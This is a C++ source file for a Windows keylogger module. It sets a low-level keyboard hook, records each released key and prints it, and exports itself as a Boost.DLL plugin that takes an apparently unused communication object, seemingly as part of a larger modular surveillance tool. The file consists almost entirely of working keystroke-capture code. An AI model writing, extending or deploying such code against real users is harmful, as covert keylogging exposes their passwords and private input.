//
// Created by Benoit Hamon on 10/3/2017.
//

#include <Windows.h>
#include <iostream>

#include <boost/dll/alias.hpp> // for BOOST_DLL_ALIAS
#include <boost/shared_ptr.hpp>

#include "ModuleKeyboard.hpp"

LRESULT CALLBACK ModuleKeyboard::hookCallback(int nCode, WPARAM wParam, LPARAM lParam ) {
    char pressedKey;
    auto pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
    switch(wParam) {
        case WM_KEYUP:
        {
            pressedKey = (char)pKeyBoard->vkCode;
        }
            break;
        default:
            return CallNextHookEx(nullptr, nCode, wParam, lParam );
    }

    std::cout << pressedKey;

    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

void ModuleKeyboard::start(ModuleCommunication &com) {
    HINSTANCE instance = GetModuleHandle(nullptr);
    HHOOK hook = SetWindowsHookEx( WH_KEYBOARD_LL, ModuleKeyboard::hookCallback, instance,0);

    MSG msg;
    while (!GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
}

void ModuleKeyboard::stop() {

}

void ModuleKeyboard::setParams() {

}

void ModuleKeyboard::setParams(std::string const &name, std::string const &value) {

};

boost::shared_ptr<ModuleKeyboard> ModuleKeyboard::create() {
    return boost::shared_ptr<ModuleKeyboard>(
            new ModuleKeyboard()
    );
}

BOOST_DLL_ALIAS(ModuleKeyboard::create, create_module)